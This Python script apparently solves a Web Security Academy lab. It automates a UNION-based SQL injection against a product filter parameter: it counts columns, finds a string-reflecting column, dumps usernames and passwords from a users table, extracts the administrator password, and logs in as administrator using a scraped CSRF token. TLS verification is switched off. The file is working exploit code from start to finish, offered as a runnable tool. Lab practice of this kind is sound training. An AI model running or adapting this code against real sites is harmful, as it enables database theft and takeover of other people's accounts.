import urllib3
import requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check_wrong_login(text):
    soup = BeautifulSoup(text, "html.parser")
    error_tag = soup.find('p', class_="is-warning")
    if error_tag:
        error = error_tag.get_text().strip()
    else:
        error = None
    if error == "Invalid username or password.":
        return False
    return True


def csrf_getter(session, url):
    resp = session.get(url, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    token_input = soup.find("input", {"name": "csrf"})
    if not token_input or not token_input.get("value"):
        raise ValueError("Unable to find CSRF token on login page")
    return token_input["value"]


def column_number_guesser(session,url) :
    apostrophe = "'"
    space = " "
    union = "UNION"
    select = "SELECT"
    initial_payload = apostrophe + space + union + space + select + space
    payload = "NULL"
    comment = "--"
    
    while (session.get(url + initial_payload + payload + comment, verify=False).status_code == 500):
        payload += ",NULL"
    
    return payload


def vulnerable_column_determination (session,url,payload):
    apostrophe = "'"
    space = " "
    union = "UNION"
    select = "SELECT"
    initial_payload = apostrophe + space + union + space + select + space
    comma = ','
    comment = "--"
    
    spots = payload.split(comma)
    trials =[]
    for i in range(len(spots)) :
        
        trial = ""
        trial += comma.join(spots[:i])
        if i == 0 :
            trial += "'a'" + comma
        elif i == len(spots) - 1  :
            trial += comma + "'a'"
        else :
            trial += comma + "'a'" + comma
        
        trial += comma.join(spots[i+1:])
        trials.append(trial)
    
    
    for trial_payload in trials :

        resp = session.get(url + initial_payload + trial_payload + comment, verify=False)
        
        if not "Internal Server Error" in resp.text :
            return  trial_payload
    
    return None

def main() :
    url = "https://0a3b003404f2d906817c4333001a00cf.web-security-academy.net"
    product_url = f'{url}/filter?category=Lifestyle'
    apostrophe = "'"
    space = " "
    union = "UNION"
    select = "SELECT"
    comment = "--"
    pipe = "||"
    concat = "~"
    username = "username"
    password = "password"
    tableName = "users"
    payload =  username + space + pipe + space + apostrophe + concat + apostrophe + space + pipe + space + password + space + "FROM" + space + tableName 

    session = requests.Session()

    number_of_columns_payload = column_number_guesser(session,product_url)
    
    type_detect_payload = vulnerable_column_determination(session,product_url,number_of_columns_payload)
    
    type_detect_payload = type_detect_payload.replace("'a'",payload)
    
    final_payload = apostrophe + space + union + space + select + space + type_detect_payload + comment

    response = session.get(product_url + final_payload, verify=False)

    soup = BeautifulSoup(response.text, "html.parser")
    admin_th = soup.find('th', string=lambda s:s and "administrator" in s)
 
    
    if admin_th:   
        password = admin_th.get_text().split('~')[1]
        print(f"Koated !!! administrator password is: {password}")
    else:
        print("Failed to find administrator credentials.")
        return None
    
    login_url = f'{url}/login'
    csrf = csrf_getter(session, login_url)
    creds = {"csrf": csrf, "username": "administrator", "password": password}
    r = session.post(login_url, data=creds, verify=False)
    
    if check_wrong_login(r.text):
        print("Koated !!")
    else:
        print("ya siks")


if __name__ == "__main__":
    main()







    
    

    


    

    
